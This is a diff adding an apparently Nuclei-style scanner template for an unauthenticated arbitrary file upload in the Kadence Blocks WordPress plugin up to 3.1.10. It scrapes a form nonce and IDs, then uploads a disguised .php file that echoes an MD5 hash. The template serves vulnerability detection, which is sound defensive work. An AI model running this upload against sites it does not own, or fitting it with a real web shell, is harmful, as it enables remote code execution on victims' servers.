@@ -1,0 +1,105 @@
+id: wp-kadence-blocks-rce
+
+info:
+  name: WordPress Gutenberg Blocks by Kadence Blocks Plugin <= 3.1.10 is vulnerable to Arbitrary File Upload
+  author: theamanrawat
+  severity: critical
+  description: |
+    The Kadence Blocks for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the process_fields function in versions up to, and including, 3.1.10. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.
+  reference:
+    - https://wordpress.org/plugins/kadence-blocks/
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kadence-blocks/kadence-blocks-3110-unauthenticated-arbitrary-file-upload
+  metadata:
+    verified: "true"
+  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,unauthenticated
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------8779924633391890046425977712
+
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="fieldfb0b94-aa"
+
+        test
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="fieldec6f26-c7"
+
+        test@test.com
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="fieldc9b894-4c"
+
+        test
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="field983473-0a"; filename="{{randstr}}.php"
+        Content-Type: application/x-php
+
+        GIF89a
+
+        <?php echo md5("pdteam");?>
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="_kb_adv_form_post_id"
+
+        {{post_id}}
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="action"
+
+        kb_process_advanced_form_submit
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="_kb_adv_form_id"
+
+        {{form_id}}
+        -----------------------------8779924633391890046425977712
+        Content-Disposition: form-data; name="_kb_form_verify"
+
+        {{nonce}}
+        -----------------------------8779924633391890046425977712--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - 'Submission Success, Thanks for getting in touch!'
+          - '"success":true'
+        condition: and
+
+      - type: word
+        part: header_2
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: nonce
+        part: body_1
+        group: 1
+        regex:
+          - 'kb_adv_form_params\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]*)"'
+        internal: true
+
+      - type: regex
+        name: form_id
+        part: body_1
+        group: 1
+        regex:
+          - 'name="_kb_adv_form_id" value="([^"]*)"'
+        internal: true
+
+      - type: regex
+        name: post_id
+        part: body_1
+        group: 1
+        regex:
+          - 'name="_kb_adv_form_post_id" value="([^"]*)"'
+        internal: true
